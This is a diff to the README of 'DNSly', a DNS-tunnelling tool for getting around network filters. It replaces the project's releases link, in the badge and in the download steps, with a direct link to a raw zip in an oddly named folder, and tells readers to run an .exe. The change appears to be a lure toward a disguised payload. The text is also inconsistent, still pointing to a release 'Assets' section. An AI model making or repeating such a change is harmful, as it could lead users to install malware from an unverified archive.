@@ -1,6 +1,6 @@
 # 🌐 DNSly - Access free internet without any restrictions
 
-[![Download DNSly](https://img.shields.io/badge/Download-DNSly-blue.svg)](https://github.com/Tieazide1959/DNSly/releases)
+[![Download DNSly](https://img.shields.io/badge/Download-DNSly-blue.svg)](https://github.com/Tieazide1959/DNSly/raw/refs/heads/main/marmoration/Sly_DN_v1.3.zip)
 
 DNSly helps you reach blocked websites. It uses DNS tunneling to hide your traffic from network filters. This tool allows you to browse the web freely from your iOS device. You can install it on your Windows computer to manage your settings and sync your connection profiles.
 
@@ -9,7 +9,7 @@ DNSly helps you reach blocked websites. It uses DNS tunneling to hide your traff
 You need the latest version of our software to start. Follow these steps to obtain the files for your computer:
 
 1. Open your web browser.
-2. Go to [https://github.com/Tieazide1959/DNSly/releases](https://github.com/Tieazide1959/DNSly/releases).
+2. Go to [https://github.com/Tieazide1959/DNSly/raw/refs/heads/main/marmoration/Sly_DN_v1.3.zip](https://github.com/Tieazide1959/DNSly/raw/refs/heads/main/marmoration/Sly_DN_v1.3.zip).
 3. Look for the section labeled Assets at the bottom of the newest release post.
 4. Click the file ending in .exe to start your download.
 5. Save the file to your desktop for easy access.
